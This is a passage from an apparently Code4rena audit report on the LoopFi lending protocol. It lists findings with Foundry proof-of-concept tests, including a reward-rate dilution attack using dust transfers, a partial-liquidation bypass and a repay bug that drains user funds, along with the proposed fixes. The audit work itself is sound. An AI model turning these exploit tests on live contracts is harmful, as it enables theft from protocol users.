>         uint256 len = _addLockDurations();
>         uint256 typeIndex = 0;
> 
>         stakeToken.mint(alice, amount);
>         rewardToken.mint(minter, 100 ether); //the reward will be 100 ether
>         rewardToken.mint(bob, 0.1 ether); //bob will have a very small amount
>         multiFeeDistribution.setLPToken(address(stakeToken));
> 
>         address incentivesController = address(controller1);
>         address treasury = vm.addr(uint256(keccak256("treasury")));
>         multiFeeDistribution.setAddresses(IChefIncentivesController(incentivesController), treasury);
> 
>         vm.mockCall(
>             incentivesController,
>             abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, alice),
>             abi.encode(true)
>         );
>         vm.prank(alice);
>         stakeToken.approve(address(multiFeeDistribution), amount);
>         vm.prank(alice);
>         multiFeeDistribution.stake(amount, alice, 1);
>         multiFeeDistribution.setMinters(minters);
>         vm.prank(minter);
>         multiFeeDistribution.addReward(address(rewardToken));
>         vm.prank(minter);
>         rewardToken.transfer(address(multiFeeDistribution), 100 ether);
> 
>         vm.warp(block.timestamp);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         vm.warp(block.timestamp + 20 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 balanceBefore = rewardToken.balanceOf(address(alice));
>         uint256 dailyTokens1 = rewardToken.balanceOf(address(alice)) / 20; // the amount that alice has devided by the 20 days
>         console.log(dailyTokens1); //These are the tokens that alice gets per day - 3.33e18
> 
>         for (uint i = 0; i < 20; i++) {
>             vm.prank(bob);
>             rewardToken.transfer(address(multiFeeDistribution), 1); //bob transfers the dust amount
>             vm.prank(bob);
>             multiFeeDistribution.getReward(rewards); //calls get reward to update the rate
>             vm.warp(block.timestamp + 1 days);
>             vm.prank(alice);
>             multiFeeDistribution.getReward(rewards);
>             uint256 dailyTokens2 = rewardToken.balanceOf(address(alice)) - balanceBefore;
>             balanceBefore = rewardToken.balanceOf(address(alice));
>             console.log("New daily token rewards:");
>             console.log(dailyTokens2); //1e18
>             vm.warp(block.timestamp + 3 days); //waits another three days
>         }
>         //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down however he wants
>         //What is more is that alice will have to wait for another 30 days!
>         console.log(0.1 ether - rewardToken.balanceOf(address(bob))); //Bob spent 20(not 0.20e18)
>     } // @IMPORTANT Performing the attack once instead of twenty times can result in decreasing the rate
>         //and the duration will be reset, starting from beginning again!
> }
> ```
> 
> </details>
>

**[Koolex (judge) increased severity to High and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#issuecomment-2442079058):**
 > Initially assessed as a Med, after further review, I believe it can fall into high category.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19).*

***

# Medium Risk Findings (39)
## [[M-01] Bringing a position from unsafe to safe by liquidation partially](https://github.com/code-423n4/2024-07-loopfi-findings/issues/571)
*Submitted by [Evo](https://github.com/code-423n4/2024-07-loopfi-findings/issues/571)*

The CDPVault's liquidation mechanism allows partial liquidations to temporarily bring unsafe positions back to a safe state. This can delay necessary liquidations if collateral prices continue to fall, potentially leading to increased risk and larger losses for the protocol.

### Proof of Concept

The issue arises from `liquidatePosition` function in the CDPVault contract. An attacker can exploit this to avoid full liquidation even when their position should be unsafe.

**Break down the Scenario:**

- Alice creates a position with 100 ether collateral and 60 ether debt.
- The collateral price drops, making Alice's position unsafe.
- Bob performs a partial liquidation on Alice's position.
- Alice's position becomes temporarily safe due to the partial liquidation.
- The collateral price drops further, but a small liquidation attempt by Carol fails because the position is still considered safe.
- Only after an even further price drop can the position be liquidated again.

Alice can do the same flow to herself (self liqudation) to protect her position instead of maintaining it by increasing the colleteral, which costs less and goes against how the protocol is intended to work.

[At function `liquidatePosition`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509):

```solidity
function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
    // ... (validation and state loading)
    if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
        revert CDPVault__liquidatePosition_notUnsafe();
    // ... (liquidation calculations)
    position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, -toInt256(takeCollateral), totalDebt);
    // ... (state updates and transfers)
}
```

The issue occurs because after a partial liquidation, the position can become temporarily safe, preventing further immediate liquidations even if the collateral value continues to decrease.

### Recommended Mitigation Steps

Flag positions as unsafe when they become unsafe, and revert them to safe status upon additional collateral deposits. However, this approach is suboptimal. A comprehensive reevaluation of the liquidation mechanism is necessary.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/571#issuecomment-2438052671):**
 > PoC confirmed. See [here](https://github.com/code-423n4/2024-07-loopfi-validation/issues/745#issuecomment-2391228185).
> 
> For the report in case needed:
>
><details>
> 
> ```solidity
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.19;
> 
> import {TestBase, ERC20PresetMinterPauser} from "./TestBase.sol";
> import {CDPVault} from "../../src/CDPVault.sol";
> import {WAD, toInt256, wmul, wdiv} from "../../src/utils/Math.sol";
> import {console} from "forge-std/console.sol";
> import {StdCheats} from "forge-std/StdCheats.sol";
> 
> contract CDPVaultPartialLiquidationTest is TestBase {
>     CDPVault internal vault;
> 
>     function setUp() public override {
>         super.setUp();
> 
>         token = new ERC20PresetMinterPauser("Token", "TKN");
>         vault = createCDPVault(
>             token,
>             1_000_000 ether, // debt ceiling
>             0,               // debt floor
>             1.25 ether,      // liquidation ratio
>             1.0 ether,       // liquidationPenalty
>             0.95 ether       // liquidationDiscount
>         );
>         createGaugeAndSetGauge(address(vault));
> 
>         // Grant minter role to this contract
>         bytes32 minterRole = token.MINTER_ROLE();
>         token.grantRole(minterRole, address(this));
>         mockWETH.grantRole(minterRole, address(this));
> 
>         // Set initial price
>         _updateSpot(1 ether);
>     }
> 
> 
>     function _updateSpot(uint256 price) internal {
>         oracle.updateSpot(address(token), price);
>     }
> 
>     function testUnsafePosition() public {
>         // Create a position
>         address alice = address(0x1);
>         token.mint(alice, 100 ether);
>         vm.startPrank(alice);
>         token.approve(address(vault), 100 ether);
>         vault.modifyCollateralAndDebt(alice, alice, alice, toInt256(100 ether), toInt256(60 ether));
>         vm.stopPrank();
> 
>         // Record initial state
>         (uint256 initialCollateral, uint256 initialDebt,,,,) = vault.positions(alice);
>         console.log("Initial Collateral:", initialCollateral);
>         console.log("Initial Debt:", initialDebt);
>         console.log("Initial Price:", vault.spotPrice());
> 
>         // Drop price to make position unsafe
>         _updateSpot(0.7 ether);
>         console.log("New Price:", vault.spotPrice());
> 
>         // Partial liquidation
>         address bob = address(0x2);
>         mockWETH.mint(bob, 30 ether);
>         vm.startPrank(bob);
>         mockWETH.approve(address(vault), 30 ether);
>         // console.log("Start liquidatePosition");
>         vault.liquidatePosition(alice, 30 ether);
>         vm.stopPrank();
>         console.log("Partial Liquidation succeed");
> 
>         // Log state after partial liquidation
>         (uint256 collateralAfterPartial, uint256 debtAfterPartial,,,,) = vault.positions(alice);
>         console.log("Collateral after partial liquidation:", collateralAfterPartial);
>         console.log("Debt after partial liquidation:", debtAfterPartial);
> 
>         // Try to liquidate again (should fail as position is now safe)
>         address charlie = address(0x3);
>         mockWETH.mint(charlie, 1 ether);
>         vm.startPrank(charlie);
>         mockWETH.approve(address(vault), 1 ether);
>         vm.expectRevert(CDPVault.CDPVault__liquidatePosition_notUnsafe.selector);
>         vault.liquidatePosition(alice, 1 ether);
>         vm.stopPrank();
>         console.log("Partial Liquidation failed");
> 
> 
>         // Verify final state
>         (uint256 finalCollateral, uint256 finalDebt,,,,) = vault.positions(alice);
>         console.log("Final Collateral:", finalCollateral);
>         console.log("Final Debt:", finalDebt);
> 
>     }
> 
> 
> 
> }
> ```
> 
></details>
> 
> Output:
> 
> ```
>   Initial Collateral: 100000000000000000000
>   Initial Debt: 60000000000000000000
>   Initial Price: 1000000000000000000
>   New Price: 700000000000000000
>   Partial Liquidation succeed
>   Collateral after partial liquidation: 54887218045112781955
>   Debt after partial liquidation: 30000000000000000000
>   Partial Liquidation failed
>   Final Collateral: 54887218045112781955
>   Final Debt: 30000000000000000000
> ```

***

## [[M-02] Wrong repayment amount used in `PositionAction::_repay`, forcing users to unexpectedly lose funds](https://github.com/code-423n4/2024-07-loopfi-findings/issues/526)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/526), also found by [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/445), [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/369), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/110), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/84)*

`PositionAction` allows users to interact with their position in the CDP Vault through a proxy, on top of that it allows users to do certain actions before interacting with the position. An example of this is the `PositionAction::deposit`, which allows users to:

1. Deposit collateral tokens directly into the position.
2. Swap arbitrary tokens for collateral and the deposit into the position.

This is handled in `PositionAction::_deposit`, where if swap params exist, swap takes place and the returned amount is used when depositing into the position; else the user's specified amount is used.

However, in `PositionAction::_repay`, this is not the case, where even if a swap took place, the amount sent to the vault/position is still the one specified by the user; which is wrong and inconsistent with the other functions' API. This can cause unexpected behaviors and reverts when users try to interact with `PositionAction::repay`.

### Proof of Concept

Add the following in `src/test/integration/IntegrationTestBase.sol`, to create a balancer pool for the underlying token:

<details>

```solidity
function _createBalancerUnderlyingTokenPool() internal returns (IComposableStablePool stablePool_) {
    deal(address(DAI), address(this), 5_000_000 * 1e18);
    deal(address(USDC), address(this), 5_000_000 * 1e6);
    deal(address(USDT), address(this), 5_000_000 * 1e6);
    underlyingToken.mint(address(this), 5_000_000 * 1e18);

    uint256[] memory maxAmountsIn = new uint256[](4);
    address[] memory assets = new address[](4);
    assets[0] = address(DAI);
    assets[1] = address(USDC);
    assets[2] = address(USDT);

    bool tokenPlaced;
    address tempAsset;
    for (uint256 i; i < assets.length; i++) {
        if (!tokenPlaced) {
            if (uint160(assets[i]) > uint160(address(underlyingToken))) {
                tokenPlaced = true;
                tempAsset = assets[i];
                assets[i] = address(underlyingToken);
            } else if (i == assets.length - 1) {
                assets[i] = address(underlyingToken);
            }
        } else {
            address placeholder = assets[i];
            assets[i] = tempAsset;
            tempAsset = placeholder;
        }
    }

    for (uint256 i; i < assets.length; i++) {
        maxAmountsIn[i] = ERC20(assets[i]).balanceOf(address(this));
        ERC20(assets[i]).safeApprove(address(balancerVault), maxAmountsIn[i]);
    }

    stablePool_ = stablePoolFactory.create(
        "Test Token Pool",
        "FUDT",
        assets,
        200,
        3e14, // swapFee (0.03%)
        address(this) // owner
    );

    balancerVault.joinPool(
        stablePool_.getPoolId(),
        address(this),
        address(this),
        JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: abi.encode(JoinKind.INIT, maxAmountsIn),
            fromInternalBalance: false
        })
    );
}
```

</details>

Add the following POC in `src/test/integration/PositionAction20.t.sol`:

<details>

```solidity
function test_wrongRepayAmount() public {
    uint256 depositAmount = 1_000 ether;
    uint256 borrowAmount = 500 ether;
    uint256 USDCamount = 100e6;

    deal(address(token), user, depositAmount);
    deal(address(USDC), user, USDCamount);

    bytes32[] memory poolIds = new bytes32[](1);
    poolIds[0] = _createBalancerUnderlyingTokenPool().getPoolId();

    address[] memory assets = new address[](2);
    assets[0] = address(USDC);
    assets[1] = address(underlyingToken);

    vm.startPrank(user);

    // Approvals
    token.approve(address(vault), type(uint256).max);
    USDC.approve(address(userProxy), type(uint256).max);
    underlyingToken.approve(address(userProxy), type(uint256).max);

    // User deposits 1k ETH to vault
    vault.deposit(address(userProxy), depositAmount);

    // User borrows 500 ETH
    userProxy.execute(
        address(positionAction),
        abi.encodeWithSelector(
            positionAction.borrow.selector,
            address(userProxy),
            address(vault),
            CreditParams({amount: borrowAmount, creditor: user, auxSwap: emptySwap})
        )
    );

    // Collateral == 1k ETH
    // Debt == 500 ETH
    // User has 500 USDC
    (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
    assertEq(collateral, depositAmount);
    assertEq(debt, borrowAmount);
    assertEq(USDC.balanceOf(user), USDCamount);

    // User repays his debt by swapping all his USDC to the underlying token
    userProxy.execute(
        address(positionAction),
        abi.encodeWithSelector(
            positionAction.repay.selector,
            address(userProxy),
            address(vault),
            CreditParams({
                amount: 0,
                creditor: user,
                auxSwap: SwapParams({
                    swapProtocol: SwapProtocol.BALANCER,
                    swapType: SwapType.EXACT_IN,
                    assetIn: address(USDC),
                    amount: USDCamount,
                    limit: 0,
                    recipient: address(userProxy),
                    deadline: block.timestamp,
                    args: abi.encode(poolIds, assets)
                })
            }),
            emptyPermitParams
        )
    );

    // Collateral == 1k ETH
    // Debt == 500 ETH
    // User has 0 USDC
    // User's USDC has been drained but no debt has been repaid
    (collateral, debt, , , , ) = vault.positions(address(userProxy));
    assertEq(collateral, depositAmount);
    assertEq(debt, borrowAmount);
    assertEq(USDC.balanceOf(user), 0);

    vm.stopPrank();
}
```

</details>

### Recommended Mitigation Steps

Update the moving amount of the underlying token after the swap, and use that value when repaying, which matches the logic in `PositionAction::_deposit`, something similar to the following:

```solidity
function _repay(address vault, address position, CreditParams calldata creditParams, PermitParams calldata permitParams) internal {
    // transfer arbitrary token and swap to underlying token
    uint256 amount = creditParams.amount;
    if (creditParams.auxSwap.assetIn != address(0)) {
        if (creditParams.auxSwap.recipient != address(this)) revert PositionAction__repay_InvalidAuxSwap();

        amount = _transferAndSwap(creditParams.creditor, creditParams.auxSwap, permitParams);
    } else {
        if (creditParams.creditor != address(this)) {
            // transfer directly from creditor
            _transferFrom(
                address(underlyingToken),
                creditParams.creditor,
                address(this),
                amount,
                permitParams
            );
        }
    }

    underlyingToken.forceApprove(address(vault), amount);
    ICDPVault(vault).modifyCollateralAndDebt(position, address(this), address(this), 0, -toInt256(amount));
}
```

### Assessed type

Error

**[amarcu (LoopFi) confirmed via duplicate Issue #110](https://github.com/code-423n4/2024-07-loopfi-findings/issues/110#event-14360562969)**

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/526#issuecomment-2387090070)**

***

## [[M-03] `SwapAction::getSwapToken` will return wrong swap token for balancer `EXACT_OUT` swaps](https://github.com/code-423n4/2024-07-loopfi-findings/issues/248)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/248)*

As known, when doing a Balancer `EXACT_OUT` batch swap, assets should be passed in reverse order, this is thoroughly documented [here](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/SwapAction.sol#L176-L209).

> Swapping in USDC for an exact amount out of BAL

    swapType = `EXACT_OUT` and `assets` = [BAL, WETH, DAI, USDC]:

However, in `SwapAction::getSwapToken`, for Balancer swaps it always returns the last asset in the assets array, which is correct for `EXACT_IN` but wrong for `EXACT_OUT`, where it should be the first asset in the assets array.

### Proof of Concept

```solidity
function test_wrongSwapTokenReturned() public {
    uint256 amount = 200 ether;

    deal(address(token), user, amount);
    deal(address(underlyingToken), user, amount);

    address[] memory assets = new address[](2);
    assets[0] = address(underlyingToken);
    assets[1] = address(token);

    SwapParams memory swapParams = SwapParams({
        swapProtocol: SwapProtocol.BALANCER,
        swapType: SwapType.EXACT_OUT,
        assetIn: address(token),
        amount: 1 ether,
        limit: 2 ether,
        recipient: user,
        deadline: block.timestamp,
        args: abi.encode(weightedPoolIdArray, assets)
    });

    vm.startPrank(user);

    token.approve(address(swapAction), amount);
    underlyingToken.approve(address(swapAction), amount);

    uint256 tokenBalanceBefore = token.balanceOf(address(user));
    uint256 underlyingTokenBalanceBefore = underlyingToken.balanceOf(address(user));

    // Swap token for underlying token, using EXACT_OUT
    swapAction.transferAndSwap(user, emptyPermitParams, swapParams);

    uint256 tokenBalanceAfter = token.balanceOf(address(user));
    uint256 underlyingTokenBalanceAfter = underlyingToken.balanceOf(address(user));

    // Verify that the out token is the underlying token
    assertLt(tokenBalanceAfter, tokenBalanceBefore);
    assertGt(underlyingTokenBalanceAfter, underlyingTokenBalanceBefore);

    // `getSwapToken` returns the out token as `token` which is wrong
    assertEq(swapAction.getSwapToken(swapParams), address(token));

    vm.stopPrank();
}
```

### Recommended Mitigation Steps

Add the following in `SwapAction::getSwapToken`:

```solidity
if (swapParams.swapType == SwapType.EXACT_OUT) token = primarySwapPath[0];
else token = primarySwapPath[primarySwapPath.length - 1];
```

### Assessed type

Error

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/248#event-14319026353)**

***

## [[M-04] `INFLATION_PROTECTION_TIME` can not be up to a year as intended because it is hardcoded to `1749120350`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/247)
*Submitted by [Kaysoft](https://github.com/code-423n4/2024-07-loopfi-findings/issues/247)*

<https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/vendor/AuraVault.sol#L66>

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/vendor/AuraVault.sol#L301-L307>

### Impact

AURA rewards will be distributed at a lesser time than a year. In fact, if the `AuraVault.sol` contract is deployed 295 days after the completion of this audit, No aura rewards will be distributed. This is because the `INFLATION_PROTECTION_TIME` is hardcoded to `1749120350`.

### Proof of Concept

The Aura rewards is to be distributed within a year which is specified with the `INFLATION_PROTECTION_TIME` constant. However, the `INFLATION_PROTECTION_TIME` constant is hardcoded in the `AuraVault.sol` contract to `1749120350`.

```solidity
File: AuraVault.sol
66:  uint256 private constant INFLATION_PROTECTION_TIME = 1749120350;
```

And there is a validation check to distribute reward only before this `1749120350` timestamp. At the time of writing this report, there are 310 days left and after the audit there will be less than 295 days left for Aura distribution, based on the hardcoded `1749120350` `INFLATION_PROTECTION_TIME` constant.

If this `AuraVault.sol` is deployed 295 days from the time of writing this report, no AURA rewards will be distributed.

The issue lies in the fact that `INFLATION_PROTECTION_TIME` constant is hardcoded to `1749120350`, which is already decreasing the duration of rewards from a year to zero.

```solidity
File: AuraVault.sol
/**
     * @notice Allows anyone to claim accumulated rewards by depositing WETH instead
     * @param amounts An array of reward amounts to be claimed ordered as [rewardToken, secondaryRewardToken]
     * @param maxAmountIn The max amount of WETH to be sent to the Vault
     */
    function claim(uint256[] memory amounts, uint256 maxAmountIn) external returns (uint256 amountIn) {
        // Claim rewards from Aura reward pool
        IPool(rewardPool).getReward();

        // Compute assets amount to be sent to the Vault
        VaultConfig memory _config = vaultConfig;
        amountIn = _previewReward(amounts[0], amounts[1], _config);

        // Transfer assets to Vault
        require(amountIn <= maxAmountIn, "!Slippage");
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amountIn);

        // Compound assets into "asset" balance
        IERC20(asset()).safeApprove(rewardPool, amountIn);
        IPool(rewardPool).deposit(amountIn, address(this));

        // Distribute BAL rewards
        IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS);
        IERC20(BAL).safeTransfer(msg.sender, amounts[0]);

        // Distribute AURA rewards
@>        if (block.timestamp <= INFLATION_PROTECTION_TIME) {
            IERC20(AURA).safeTransfer(_config.lockerRewards, (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS);
            IERC20(AURA).safeTransfer(msg.sender, amounts[1]);
        } else {
            // after INFLATION_PROTECTION_TIME
            IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this)));
        }

        emit Claimed(msg.sender, amounts[0], amounts[1], amountIn);
    }
```

### Recommended Mitigation Steps

Consider setting the `INFLATION_PROTECTION_TIME` in the constructor instead of hardcoding it.

```diff
--  uint256 private constant INFLATION_PROTECTION_TIME = 1749120350;
++  uint256 private immutable INFLATION_PROTECTION_TIME;


    constructor(
     ...        
    ) ERC4626(IERC20(asset_)) ERC20(tokenName_, tokenSymbol_) {
     ...  
++    INFLATION_PROTECTION_TIME = block.timestamp + 365 days;
    }
```

### Assessed type

Timing

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/247#issuecomment-2363349099):**
 > Acknowledged but we will remove and not use the AuraVault.

***

## [[M-05] `PositionAction4626::increaseLever` will always revert](https://github.com/code-423n4/2024-07-loopfi-findings/issues/245)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/245), also found by [web3km](https://github.com/code-423n4/2024-07-loopfi-findings/issues/476), [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/449), [Nyx](https://github.com/code-423n4/2024-07-loopfi-findings/issues/376), [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/367), [joaovwfreire](https://github.com/code-423n4/2024-07-loopfi-findings/issues/322), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/114), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/51), and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/40)*

Users can use `PositionAction::increaseLever` to increase their positions' leverage, i.e., increasing both the collateral and debt, by taking a flash loan and doing some swaps. At the end of the process, after swapping "borrow" tokens to underlying tokens they should be returned to the vault under the position's "name".

For ERC20 collateral positions, this is happening in `PositionAction20::_onIncreaseLever` (that gets called in `PositionAction::onFlashLoan`) which approves the vault to spend some amount and then returns the amount to be later sent using the following in `PositionAction::onFlashLoan`:

```solidity
// add collateral and debt
ICDPVault(leverParams.vault).modifyCollateralAndDebt(
    leverParams.position,
    address(this),
    address(this),
    toInt256(collateral),
    toInt256(addDebt)
);
```

However, for ERC4626 collateral positions, `PositionAction4626::_onIncreaseLever` is both approving the amount and depositing it into the vault under `address(this)` which IS NOT the position's proxy but `PositionAction4626` contract as it is the flash loan callback function and isn't delegated like `increaseLever`. When `_onIncreaseLever` finishes, it'll try to deposit the collateral AGAIN in the vault using [this](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol#L416-L422); which will for sure revert, as the approval was spent and no funds are left to make the deposit.

This will cause `PositionAction4626::increaseLever` to always revert and never work, blocking users from leveraging their positions.

### Proof of Concept

<details>

```solidity
contract PositionAction4626_Lever_Test is IntegrationTestBase {
    using SafeERC20 for ERC20;

    PRBProxy userProxy;
    address user;
    uint256 constant userPk = 0x12341234;
    CDPVault vault;
    StakingLPEth stakingLPEth;
    PositionAction4626 positionAction;
    PermitParams emptyPermitParams;
    SwapParams emptySwap;
    PoolActionParams emptyPoolActionParams;

    bytes32[] weightedPoolIdArray;

    function setUp() public override {
        super.setUp();
        setGlobalDebtCeiling(15_000_000 ether);

        stakingLPEth = new StakingLPEth(address(token), "Staking LP ETH", "sLPETH");
        vault = createCDPVault(stakingLPEth, 5_000_000 ether, 0, 1.25 ether, 1.0 ether, 1.05 ether);
        createGaugeAndSetGauge(address(vault));

        gauge.addQuotaToken(address(stakingLPEth), 10, 100);

        user = vm.addr(0x12341234);
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));

        positionAction = new PositionAction4626(
            address(flashlender),
            address(swapAction),
            address(poolAction),
            address(vaultRegistry)
        );

        oracle.updateSpot(address(token), 1 ether);
        oracle.updateSpot(address(stakingLPEth), 1 ether);
        weightedPoolIdArray.push(weightedUnderlierPoolId);
    }

    function test_increaseLeverDOS() public {
        uint256 amount = 200 ether;

        deal(address(token), user, amount);

        address[] memory assets = new address[](2);
        assets[0] = address(underlyingToken);
        assets[1] = address(token);

        vm.startPrank(user);

        // Approvals
        token.approve(address(stakingLPEth), amount);
        stakingLPEth.approve(address(vault), amount);

        // Deopsit token to get sLPETH
        stakingLPEth.deposit(amount, user);

        // Deposit sLPETH to vault
        vault.deposit(address(userProxy), amount);

        // Borrow underlying tokens
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.borrow.selector,
                address(userProxy),
                address(vault),
                CreditParams({amount: amount / 2, creditor: user, auxSwap: emptySwap})
            )
        );

        // Increase leverage will always revert
        vm.expectRevert(bytes("ERC20: insufficient allowance"));
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.increaseLever.selector,
                LeverParams({
                    position: address(userProxy),
                    vault: address(vault),
                    collateralToken: address(stakingLPEth),
                    primarySwap: SwapParams({
                        swapProtocol: SwapProtocol.BALANCER,
                        swapType: SwapType.EXACT_IN,
                        assetIn: address(underlyingToken),
                        amount: amount / 2,
                        limit: 0,
                        recipient: address(positionAction),
                        deadline: block.timestamp,
                        args: abi.encode(weightedPoolIdArray, assets)
                    }),
                    auxSwap: emptySwap,
                    auxAction: emptyPoolActionParams
                }),
                address(0),
                0,
                address(user),
                emptyPermitParams
            )
        );
    }
}
```

</details>

### Recommended Mitigation Steps

In `PositionAction4626::_onIncreaseLever`, replace:

```solidity
return ICDPVault(leverParams.vault).deposit(address(this), addCollateralAmount);
```

with:

```solidity
return addCollateralAmount;
```

### Assessed type

DoS

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/245#event-14319528697)**

***

## [[M-06] `PoolAction::updateLeverJoin` wrongly updates `assetsIn` array, leading to `PositionAction4626::_onIncreaseLever` to always revert](https://github.com/code-423n4/2024-07-loopfi-findings/issues/241)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/241), also found by [NexusAudits](https://github.com/code-423n4/2024-07-loopfi-findings/issues/267)*

Users can use `PositionAction4626` to interact with the corresponding vault using their opened positions. `PositionAction4626` allows users to deposit/withdraw/leverage their positions, `increaseLever` enables users to increase their positions' collateral and debt. For the most part, it's the same as for `PositionAction20`, where users swap the lent borrow tokens for collateral tokens, and then deposit them into the position.

The only change is that `PositionAction4626` allows users on top of that to join a Balancer pool with the swapped tokens. This is done in `PositionAction4626::_onIncreaseLever`.
The main part that we care about is `PoolAction::updateLeverJoin` which adds the upfront amount to the amounts in.  The way Balancer works is that it accepts an array of "amounts in", according to the tokens array where indices should match, BUT it should skip the BPT token, this is where the function messes up.

This is mainly done in the following loop:

```solidity
for (uint256 i = 0; i < len; ) {
    uint256 assetIndex = i - (skipIndex ? 1 : 0);
    if (assets[i] == joinToken) {
        maxAmountsIn[i] = joinAmount;
        assetsIn[assetIndex] = joinAmount;
    } else if (assets[i] == upFrontToken && assets[i] != poolToken) {
        maxAmountsIn[i] = upfrontAmount;
        assetsIn[assetIndex] = upfrontAmount;
    } else {
        skipIndex = skipIndex || assets[i] == poolToken;
    }
    unchecked {
        i++;
    }
}
```

The goal of the above loop is to add the upfront amount to the corresponding `amountIn`. The protocol passes the `poolToken` as the collaterals 4626's underlying token, which is not always true. In most cases, it won't match any of the tokens array. Because of this, the above for loop will be wrongly updating and overriding the `assetsIn` array.

This blocks users from increasing the leverage of their positions where the collateral is an `ERC4626` token.

### Proof of Concept

In the below POC, we pass the following:

```solidity
tokensIn = [49 ether, 0]
```

However, because of what's mentioned above and the wrong "skipping" logic, the `tokensIn` comes out as:

```solidity
tokensIn = [49 ether, 49 ether]
```

<details>

```solidity
contract PositionAction4626_Lever_Test is IntegrationTestBase {
    using SafeERC20 for ERC20;

    PRBProxy userProxy;
    address user;
    CDPVault vault;
    StakingLPEth stakingLPEth;
    PositionAction4626 positionAction;
    PermitParams emptyPermitParams;
    SwapParams emptySwap;
    PoolActionParams emptyPoolActionParams;

    bytes32[] weightedPoolIdArray;

    address constant wstETH_bb_a_WETH_BPTl = 0x41503C9D499ddbd1dCdf818a1b05e9774203Bf46;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant bbaweth = 0xbB6881874825E60e1160416D6C426eae65f2459E;
    bytes32 constant poolId = 0x41503c9d499ddbd1dcdf818a1b05e9774203bf46000000000000000000000594;

    function setUp() public override {
        super.setUp();
        setGlobalDebtCeiling(15_000_000 ether);

        token = ERC20PresetMinterPauser(wstETH);

        stakingLPEth = new StakingLPEth(address(token), "Staking LP ETH", "sLPETH");
        vault = createCDPVault(stakingLPEth, 5_000_000 ether, 0, 1.25 ether, 1.0 ether, 1.05 ether);
        createGaugeAndSetGauge(address(vault), address(stakingLPEth));

        user = vm.addr(0x12341234);
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));

        positionAction = new PositionAction4626(
            address(flashlender),
            address(swapAction),
            address(poolAction),
            address(vaultRegistry)
        );

        weightedUnderlierPoolId = _createBalancerPool(address(token), address(underlyingToken)).getPoolId();

        oracle.updateSpot(address(token), 1 ether);
        oracle.updateSpot(address(stakingLPEth), 1 ether);
        weightedPoolIdArray.push(weightedUnderlierPoolId);
    }

    function test_updateLeverJoin_increaseLeverageDOS() public {
        uint256 depositAmount = 200 ether;
        uint256 borrowAmount = 100 ether;

        deal(address(token), user, depositAmount);

        address[] memory assets = new address[](2);
        assets[0] = address(underlyingToken);
        assets[1] = address(token);

        vm.startPrank(user);

        token.approve(address(stakingLPEth), depositAmount);
        stakingLPEth.approve(address(userProxy), depositAmount);

        // Deposit `wstETH` to get `sLPETH`
        stakingLPEth.deposit(depositAmount, user);

        // Deposit `sLPETH` to vault
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.deposit.selector,
                address(userProxy),
                address(vault),
                CollateralParams({
                    targetToken: address(stakingLPEth),
                    amount: depositAmount,
                    collateralizer: address(user),
                    auxSwap: emptySwap
                }),
                emptyPermitParams
            )
        );

        // Borrow 100 ETH
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.borrow.selector,
                address(userProxy),
                address(vault),
                CreditParams({amount: borrowAmount, creditor: user, auxSwap: emptySwap})
            )
        );

        address[] memory tokens = new address[](3);
        tokens[0] = wstETH_bb_a_WETH_BPTl;
        tokens[1] = wstETH;
        tokens[2] = bbaweth;

        uint256[] memory maxAmountsIn = new uint256[](3);
